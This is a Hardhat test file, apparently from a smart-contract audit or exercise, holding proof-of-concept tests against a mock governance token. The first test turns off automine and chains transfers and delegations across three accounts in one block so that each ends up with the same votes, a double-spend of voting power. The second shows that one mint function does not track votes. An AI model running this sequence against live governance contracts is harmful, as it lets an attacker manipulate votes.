import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers,testUtils } from "hardhat";



describe("Mock Gov", function () {
    // We define a fixture to reuse the same setup in every test.
    // We use loadFixture to run this setup once, snapshot that state,
    // and reset Hardhat Network to that snapshot in every test.
    async function deploymentstate() {

      // Contracts are deployed using the first signer/account by default
      const [owner, addr1,addr2] = await ethers.getSigners();
  
      const Gov = await ethers.getContractFactory("MockGovToken");
      // const Gov = await ethers.getContractFactory("Recommended");
      const gov = await Gov.deploy();
      return { gov, owner, addr1,addr2 };
    }

    it("Exploiting that transfers are not tracked, by Double spending votes within the same block",async function (){
        const {gov, owner, addr1,addr2 } = await loadFixture(deploymentstate);

        const mint_tx = await gov.connect(owner)["mint(address,uint256)"](owner.address,ethers.utils.parseEther("10"));
        await mint_tx.wait();

        expect(await gov.balanceOf(owner.address)).to.equal(ethers.utils.parseEther("10"));

        const delegate_owner_tx = await gov.delegate(owner.address);
        await delegate_owner_tx.wait();

        expect(await gov.getCurrentVotes(owner.address)).to.equal(ethers.utils.parseEther("10"));

        const { block } = testUtils;
        
        const blocknumber_before_exploit = await block.latestBlockNumber()
        console.log(blocknumber_before_exploit);
        await block.setAutomine(false);

        const transfer_tx1 = await gov.connect(owner).transfer(addr1.address,ethers.utils.parseEther("10"))
        // await transfer_tx1.wait();


        const delegate_addr1_tx = await gov.connect(addr1).delegate(addr1.address);
        // await delegate_addr1_tx.wait();

        const transfer_tx2 = await gov.connect(addr1).transfer(addr2.address,ethers.utils.parseEther("10"))
        // await transfer_tx2.wait();

        const delegate_addr2_tx = await gov.connect(addr2).delegate(addr2.address);
        // await delegate_addr2_tx.wait();
        await block.setAutomine(true);

        const recpt1 =   transfer_tx2.wait();
        const recpt2 =   transfer_tx2.wait();
        await block.advance();

        // console.log(recpt2.blockNumber)
        console.log(await block.latestBlockNumber());
        

        expect(await gov.connect(addr2).getCurrentVotes(addr2.address)).to.equal(ethers.utils.parseEther("10"));
        expect(await gov.connect(addr1).getCurrentVotes(addr1.address)).to.equal(ethers.utils.parseEther("10"));
        expect(await gov.connect(owner).getCurrentVotes(owner.address)).to.equal(ethers.utils.parseEther("10"));
        
        await block.setAutomine(true);

    })

    it("Mint(uint256 amount) function isn't tracking votes",async function (){
      const {gov, owner } = await loadFixture(deploymentstate);
      
      const delegate_owner_tx = await gov.delegate(owner.address);
      await delegate_owner_tx.wait();

      const mint_tx = await gov["mint(uint256)"](ethers.utils.parseEther("10"));
      await mint_tx.wait();

      expect (await gov.balanceOf(owner.address)).to.equal(ethers.utils.parseEther("10"));
      expect(await gov.getCurrentVotes(owner.address)).to.not.equal(ethers.utils.parseEther("10"));
    
    })

})